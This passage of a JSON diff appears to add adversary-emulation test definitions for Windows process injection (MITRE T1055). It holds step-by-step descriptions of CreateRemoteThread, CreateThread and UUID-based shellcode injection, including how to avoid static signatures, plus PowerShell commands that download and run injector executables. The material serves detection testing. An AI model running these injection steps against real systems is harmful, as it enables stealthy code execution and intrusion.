+                        "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)",
+                        "auto_generated_guid": "2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39",
+                        "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "spawn_process_path": {
+                                "description": "Path of the binary to spawn",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\werfault.exe"
+                            },
+                            "spawn_process_name": {
+                                "description": "Name of the process spawned",
+                                "type": "string",
+                                "default": "werfault"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Process Injection with Go using CreateThread WinAPI",
+                        "auto_generated_guid": "2871ed59-3837-4a52-9107-99500ebc87cb",
+                        "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Process Injection with Go using CreateThread WinAPI (Natively)",
+                        "auto_generated_guid": "2a3c7035-d14f-467a-af94-933e49fe6786",
+                        "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "UUID custom process Injection",
+                        "auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5304734f1e1",
+                        "description": "The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread\n\nThe injected shellcode will open a message box and a notepad.\n\nReference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\nConcept from: http://ropgadget.com/posts/abusing_win_functions.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "exe_binary": {
+                                "description": "PE binary",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1055\\bin\\x64\\uuid_injection.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n",
+                                "prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/uuid_injection.exe\" -OutFile \"#{exe_binary}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+                            "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 11:45:18"
+}
